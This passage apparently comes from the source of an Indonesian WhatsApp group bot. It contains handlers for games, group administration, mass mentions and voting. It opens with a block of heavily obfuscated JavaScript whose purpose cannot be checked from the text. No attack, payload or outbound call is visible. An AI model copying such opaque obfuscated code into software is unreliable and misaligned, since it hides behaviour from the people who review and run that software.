_0xd854bd=_0x24e655[_0xa3f7bd(0x5ea,0x723,0x7cb,'WT)G',0x793)](_0x1c13eb,arguments);return _0x5193d7=null,_0xd854bd;}}:function(){};return _0x32bc90=![],_0xefd4c2;}else{if(_0x3cd7af){if(_0xf22032[_0x204ba9(0x16d,0x2d9,0x30a,0x1b3,'lHWR')](_0xf22032[_0x12adba(0x50b,0x523,0x5ce,0x74c,'$2Np')],_0xf22032[_0x12adba(0x42e,0x3d9,0x32d,0x4c5,'@A%5')]))_0x386305=_0xf22032[_0x3339f3(0x7ad,0x61f,0x62f,0x4f1,'tkFS')](_0x38491d,_0xf22032[_0x12adba(0x32d,0x3a4,0x3e3,0x32d,'bSee')](_0xf22032[_0x3339f3(0x65b,0x57e,0x519,0x3b9,'iryF')](_0xf22032[_0x12adba(0x3e3,0x491,0x4bb,0x360,'(uJQ')],_0xf22032[_0x204ba9(0x15c,0x25c,0x3f5,0x172,'tkFS')]),');'))();else return _0xf8a02;}else{if(_0xf22032[_0x204ba9(0x5,0x9a,-0x1b,-0x7f,'Mr6b')](_0xf22032[_0x2a89bd(0x478,0x60f,0x4c6,0x6d6,'(uJQ')],_0xf22032[_0x3339f3(0x4a9,0x509,0x46c,0x33b,'O[4M')]))_0xf22032[_0x2a89bd(0x70b,0x580,0x45f,0x47c,'71Tx')](_0xf8a02,0x1f17+-0x6*-0x55d+-0x3f45);else return _0x30c7a7[_0x204ba9(0x11d,0x1fa,0xa8,0x1b6,'Mr6b')+_0x53aa28(0x9,-0x135,-0xd3,'^3QZ',-0x282)]()[_0x12adba(0x661,0x6ae,0x575,0x4da,'@A%5')+'h'](_0xf22032[_0x53aa28(0xe0,0xb9,-0x13,'$2Np',0x1dd)])[_0x204ba9(0x11c,0x202,0x30b,0x202,'1vlC')+_0x204ba9(0x18f,0x253,0x236,0x133,'3CnB')]()[_0x12adba(0x61f,0x542,0x4e5,0x59b,'E66y')+_0x204ba9(0x31e,0x308,0x1df,0x4a2,'E66y')+'r'](_0xad0f7e)[_0x12adba(0x5a2,0x3ea,0x570,0x6de,'4zjg')+'h'](_0xf22032[_0x204ba9(0x4bd,0x332,0x464,0x315,'8vi]')]);}}}catch(_0x2ecefd){}}
            break
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
        	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await kiki.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await kiki.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            kiki.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await kiki.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) kiki.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    kiki.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    kiki.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    kiki.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    kiki.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    kiki.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    kiki.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    kiki.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await kiki.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await kiki.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    kiki.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kiki.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kiki.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kiki.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kiki.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kiki.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kiki.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kiki.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kiki.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kiki.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kiki.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kiki.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kiki.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kiki.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kiki.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    kiki.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kiki.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kiki.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endGLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                kiki.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, jawab, kiki.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, jawab, kiki.user.name, m, {mentions: menst})
            }
            break
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await kiki.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await kiki.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n Packname : ${global.packname}\n Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kiki.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kiki.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kiki.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kiki.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kiki.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await kiki.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await kiki.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await kiki.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                await kiki.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                await kiki.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
let teks = ` *👥 Tag All*\n\n`
                for (let mem of participants) {
                teks += `➲ ${q ? q : ''} @${mem.id.split('@')[0]}\n`
                }
                kiki.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isAdmins) throw mess.admin
            kiki.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += ` *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: kiki.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            kiki.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: kiki.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            kiki.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: kiki.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            kiki.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${kiki.user.id}
`
kiki.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await kiki.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await kiki.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
